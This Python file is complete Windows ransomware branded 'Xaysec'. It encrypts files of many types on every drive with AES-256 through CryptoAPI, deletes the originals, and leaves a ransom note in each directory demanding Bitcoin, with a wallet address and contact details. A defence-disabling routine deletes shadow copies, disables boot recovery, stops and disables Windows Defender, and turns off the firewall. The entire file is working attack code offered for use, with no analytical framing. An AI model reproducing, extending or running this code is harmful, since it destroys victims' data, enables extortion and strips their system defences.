import os
import sys
import ctypes
from ctypes import wintypes
import struct
import hashlib
import string
import threading
import subprocess
from pathlib import Path

# ======================== CryptoAPI ========================
advapi32 = ctypes.windll.advapi32
kernel32 = ctypes.windll.kernel32

PROV_RSA_AES = 24
CRYPT_VERIFYCONTEXT = 0xF0000000
CALG_AES_256 = 0x00006610
CRYPT_MODE_CBC = 1
CRYPT_EXPORTABLE = 0x00000001
PLAINTEXTKEYBLOB = 0x08
CUR_BLOB_VERSION = 2
KP_IV = 1
KP_MODE = 4

class AES256_CBC:
    def __init__(self, key, iv):
        self.hProv = wintypes.HCRYPTPROV()
        self.hKey = wintypes.HCRYPTKEY()
        if not advapi32.CryptAcquireContextW(ctypes.byref(self.hProv), None, None,
                                              PROV_RSA_AES, CRYPT_VERIFYCONTEXT):
            raise RuntimeError("CryptAcquireContext failed")
        key_blob = self._build_plaintext_keyblob(key)
        if not advapi32.CryptImportKey(self.hProv, key_blob, len(key_blob), 0,
                                       CRYPT_EXPORTABLE, ctypes.byref(self.hKey)):
            raise RuntimeError("CryptImportKey failed")
        iv_bytes = (ctypes.c_char * 16)(*iv)
        if not advapi32.CryptSetKeyParam(self.hKey, KP_IV, iv_bytes, 0):
            raise RuntimeError("CryptSetKeyParam IV failed")
        mode = ctypes.c_int(CRYPT_MODE_CBC)
        if not advapi32.CryptSetKeyParam(self.hKey, KP_MODE, ctypes.byref(mode), 0):
            raise RuntimeError("CryptSetKeyParam mode failed")

    def _build_plaintext_keyblob(self, key):
        header_len = 12
        blob = (ctypes.c_char * (header_len + len(key)))()
        struct.pack_into("<I", blob, 0, PLAINTEXTKEYBLOB)
        struct.pack_into("<I", blob, 4, CUR_BLOB_VERSION)
        struct.pack_into("<I", blob, 8, CALG_AES_256)
        ctypes.memmove(ctypes.byref(blob, header_len), key, len(key))
        return blob

    def encrypt(self, plaintext):
        # Buffer harus cukup untuk hasil + kemungkinan padding
        buf_len = len(plaintext) + 16
        buf = (ctypes.c_char * buf_len)()
        ctypes.memmove(buf, plaintext, len(plaintext))
        data_len = wintypes.DWORD(len(plaintext))
        if not advapi32.CryptEncrypt(self.hKey, 0, True, 0, buf, ctypes.byref(data_len), buf_len):
            raise RuntimeError("CryptEncrypt failed")
        return bytes(buf[:data_len.value])

    def close(self):
        if self.hKey:
            advapi32.CryptDestroyKey(self.hKey)
        if self.hProv:
            advapi32.CryptReleaseContext(self.hProv, 0)

# ======================== Konfigurasi ========================
PASSPHRASE = "xAY$ec_Ultra#Key!2024"
SALT = bytes.fromhex('3a7c9f1eb245d861e904f3a7c61b5e82')

TARGET_EXTENSIONS = {
    '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
    '.txt', '.csv', '.rtf', '.odt', '.ods', '.odp',
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.ico',
    '.mp3', '.wav', '.wma', '.aac', '.flac', '.ogg',
    '.mp4', '.avi', '.mov', '.mkv', '.wmv', '.flv',
    '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2',
    '.db', '.sql', '.sqlite', '.mdb', '.accdb',
    '.html', '.php', '.asp', '.aspx', '.js', '.css',
    '.py', '.java', '.c', '.cpp', '.h', '.cs', '.vb',
    '.ps1', '.bat', '.cmd', '.sh',
    '.ini', '.cfg', '.conf', '.log',
    '.xml', '.json', '.yaml', '.yml', '.toml',
    '.svg', '.psd', '.ai', '.eps',
    '.iso', '.img', '.vmdk', '.vhd', '.vhdx',
}

RANSOM_NOTE = """YOUR FILES ARE ENCRYPTED
All your important data has been encrypted with AES-256.
To recover files, send 1000 USD in Bitcoin to:
bc1qvd00grpp3kea4nlgexvv7ktam62fv9lepfyt6w

After payment, contact: leakserversupport@gmail.com
You will receive decryption tool and key.

Free test decryption for 1 small file:
https://xaysec.zya.me/

Do not rename or modify files – permanent loss."""

# ======================== Fungsi Utama ========================
def derive_key(passphrase, salt):
    return hashlib.pbkdf2_hmac('sha256', passphrase.encode(), salt, 200000, dklen=32)

def encrypt_file(file_path, key):
    try:
        iv = os.urandom(16)
        with open(file_path, 'rb') as f:
            plain_data = f.read()
        if not plain_data:  # jangan enkripsi file kosong
            return
        cipher = AES256_CBC(key, iv)
        encrypted = cipher.encrypt(plain_data)
        cipher.close()
        # Ubah ekstensi langsung menjadi .Xaysec
        new_path = file_path.with_suffix('.Xaysec')
        with open(new_path, 'wb') as f:
            f.write(iv + encrypted)
        os.remove(file_path)  # hapus file asli
    except Exception:
        pass

def should_encrypt(file_path):
    ext = file_path.suffix.lower()
    return ext in TARGET_EXTENSIONS

def process_directory(directory, key):
    # Sebarkan note tebusan di setiap direktori
    ransom_path = os.path.join(directory, "Xaysec_ReadMe.txt")
    try:
        with open(ransom_path, 'w') as f:
            f.write(RANSOM_NOTE)
    except:
        pass
    # Enkripsi file di direktori
    try:
        for entry in os.listdir(directory):
            full_path = os.path.join(directory, entry)
            if os.path.isfile(full_path):
                p = Path(full_path)
                if should_encrypt(p):
                    encrypt_file(p, key)
    except:
        pass

def worker(drive, key):
    for root, dirs, files in os.walk(drive):
        process_directory(root, key)

def run_cmd(cmd):
    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def disable_defenses():
    commands = [
        'vssadmin delete shadows /all /quiet',
        'wmic shadowcopy delete',
        'bcdedit /set {default} recoveryenabled No',
        'sc stop WinDefend',
        'sc config WinDefend start= disabled',
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
        'netsh advfirewall set allprofiles state off',
    ]
    for cmd in commands:
        try:
            run_cmd(cmd)
        except:
            pass

def main():
    key = derive_key(PASSPHRASE, SALT)
    drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
    disable_defenses()
    threads = []
    for drv in drives:
        t = threading.Thread(target=worker, args=(drv, key))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

if __name__ == "__main__":
    main()